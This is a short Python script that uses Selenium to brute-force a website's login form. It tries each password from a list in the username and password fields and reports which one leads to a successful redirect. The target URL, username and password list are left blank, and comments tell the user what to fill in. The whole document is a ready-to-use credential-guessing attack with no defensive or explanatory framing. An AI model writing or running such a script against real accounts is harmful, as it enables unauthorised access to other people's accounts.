from selenium import webdriver
import time
passwords =[
    'test','test2','password list goes here, or parse with json',"test33"
]
for passt in passwords:
    browser = webdriver.Chrome('chromedriver.exe') #Download this seperately
    url = "" #URL
    browser.get(url)
    username = browser.find_element_by_name("username") #Username form name
    password = browser.find_element_by_name("password") #Password form name
    username.send_keys("") #Username
    password.send_keys(passt) #Checks every password
    button = browser.find_element_by_name("login_btn") #Change to name of submit button
    button.click()
    print("trying password {0}".format(passt))
    time.sleep(1)
    if browser.current_url == '': ##Change to redirect URL when a successful login attempt is made, or make it NOT the current
        print("{0} is the password".format(passt))
        exit()
